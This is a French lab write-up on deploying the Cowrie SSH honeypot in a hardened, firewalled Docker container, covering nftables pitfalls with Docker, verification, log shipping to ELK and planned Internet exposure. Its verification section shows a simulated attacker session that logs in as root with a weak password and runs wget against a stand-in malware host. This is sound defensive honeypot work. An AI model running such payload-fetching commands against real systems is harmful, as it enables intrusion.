# TP 3 — Déployer Cowrie en conteneur isolé

> Version complète avec schémas : [pdf/TP3-cowrie.pdf](../pdf/TP3-cowrie.pdf).
> Les manipulations ont été exécutées sur la machine ; les résultats réels sont donnés. Chaque section se termine par des questions et des commandes à refaire.

## 0. Le problème corrigé avant de commencer

Voir [journal/2026-09-26-cowrie.md](../journal/2026-09-26-cowrie.md) pour le détail de l'incident du 24/09.

**Leçon technique :** une règle posée par `nft add rule` ne survit à aucun rechargement. Seul un fichier lu par le service persiste.

**Leçon de conception :** fermer la sortie Internet de l'**hôte** était une extension non demandée du cahier des charges. La menace réelle (Cowrie compromis) se contient dans `forward`, pas dans `output`.

**Exo 0.1** — Vérifier :
```bash
sudo nft list ruleset | grep -E 'policy|daddr 192.168.1'
sudo systemctl reload nftables        # l'opération qui coupait tout
sudo nft list ruleset | grep -c 'policy drop'   # doit afficher 3
```

Scripts de secours : `sudo fw-panic` (vide tout) et `sudo fw-restore` (recharge).

## 1. Installer Docker sans casser le pare-feu

Docker ajoute 4 tables (`ip nat`, `ip filter`, `ip6 nat`, `ip6 filter`), gérées par `iptables-nft`.

**Piège 1 — `flush ruleset` détruit les tables Docker.** Corrigé avant installation :
```
table inet filter          # crée la table si absente
flush table inet filter    # ne vide QUE la nôtre
```
**Exo 1.1** — `sudo systemctl reload nftables && sudo nft list tables | wc -l` → doit afficher 5. *Résultat obtenu : 5, conteneur intact.*

**Piège 2 — le DNAT décale les ports.** `-p 22:2222` crée une traduction en `prerouting`, donc **avant** `forward`. La chaîne voit le port du conteneur :
```
define COWRIE_PORTS  = { 22, 23 }        # publiés
define COWRIE_CPORTS = { 2222, 2223 }    # vus par forward
```
Une règle `tcp dport 22` dans `forward` ne matcherait jamais — et Cowrie fonctionnerait quand même, via les règles permissives de Docker.

## 2. Déployer Cowrie

Config retenue (`/opt/cowrie/etc/cowrie.cfg`) : `hostname = srv-prod-01`, `ttylog = true`, `backend = shell` (rien n'est exécuté), fausse bannière `OpenSSH_8.9p1`.

**Question ouverte :** le vrai sshd annonce `OpenSSH_9.6p1`. Un scan des deux ports révèle deux systèmes différents. Aligner les bannières, ou garder une version ancienne plus attirante ? Les deux se défendent.

Authentification : `userdb.txt` avec des mots de passe faibles réalistes (`AuthRandom` rendait les tests non reproductibles).

Durcissement : `read_only`, `cap_drop: ALL`, `no-new-privileges`, `pids_limit: 200`, `mem_limit: 512m`. L'image tourne en `999:999` et n'embarque aucun shell :
```
$ sudo docker exec cowrie sh
OCI runtime exec failed: exec: "sh": executable file not found in $PATH
```

## 3. Vérifier

```
$ nc 192.168.1.63 22   | head -1
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4      <- Cowrie
$ nc 192.168.1.63 2727 | head -1
SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.19    <- vrai sshd
```

Session d'attaquant simulée :
```
$ sshpass -p '123456' ssh root@192.168.1.63 'uname -a; id; wget http://malware.example/x.sh'
Linux srv-prod-01 6.1.0-21-amd64 ... x86_64 GNU/Linux
uid=0(root) gid=0(root) groups=0(root)
Resolving malware.example... failed: Temporary failure in name resolution.
```
L'attaquant se croit root sur un Debian. Son `wget` échoue **parce que le pare-feu bloque la sortie du conteneur** ; l'URL est journalisée quand même.

Capturé dans `cowrie.json` : `session.connect`, `client.version`, `login.failed`, `login.success`, `command.input`, plus un enregistrement TTY rejouable.

### Le test d'isolation

```
$ sudo docker run --rm --network cowrie_default alpine sh -c '...'
  -> 192.168.1.254 (box)     : BLOQUE
  -> 192.168.1.33 (PC admin) : BLOQUE
  -> 192.168.1.63:2727 (SSH) : BLOQUE
  -> 1.1.1.1:443 (Internet)  : BLOQUE
  -> 192.168.1.35:5044 (ELK) : autorisé (VM éteinte)
```
Chaque refus tracé : `dmesg | grep FWD-CONTAINER-DROP`.

**C'est la preuve que tout le projet cherchait.** Un attaquant maître du conteneur ne peut joindre que le collecteur de logs.

## 4. Expédier vers ELK

Voie A du TP 1 : Cowrie écrit un fichier, Filebeat (sur l'**hôte**) l'expédie à Logstash:5044 → règle dans `output`.

Le parseur `ndjson` est essentiel : sans lui chaque ligne est du texte brut ; avec lui chaque champ Cowrie devient interrogeable dans Kibana.

État : Filebeat actif, fichier dans le registre, réessaie vers `.35` (VM éteinte). Aucun `OUT-DROP` vers `.35` → la règle passe.

**Exo 4.1** — côté ELK : `input { beats { port => 5044 } }`, filtres à écrire (ECS, geoip, timestamp), index daté + ILM.

**Exo 4.2** — tableaux de bord : top identifiants, carte des sources, commandes fréquentes, **URL de téléchargement** (le plus précieux).

## 5. Durcir l'hôte

fail2ban sur le port **2727 uniquement**. Il ne doit **jamais** surveiller 22/23 : bannir les attaquants reviendrait à saborder le honeypot.

## 6. Phase 2 — exposition Internet

**Point critique : l'IPv6.** La machine a une adresse publique routable. Sans restriction de source, Cowrie aurait été exposé dès son démarrage, sans aucune redirection de port. D'où :
```
ip  saddr $LAN  tcp dport $COWRIE_PORTS ct state new accept
ip6 saddr $LAN6 tcp dport $COWRIE_PORTS ct state new accept
```

Marche à suivre : retirer les restrictions `saddr` (input **et** forward), redirection WAN 22 → `.63:22` sur la Freebox, décider pour l'IPv6, vérifier depuis l'extérieur, surveiller le volume.

**Exo 6.1** — questions préalables : conditions de l'opérateur ? que se passe-t-il si le honeypot sert de relais (la réponse doit être « rien », et il faut pouvoir le démontrer) ? durée de conservation des IP (RGPD) ? comment saurai-je qu'il est tombé ?
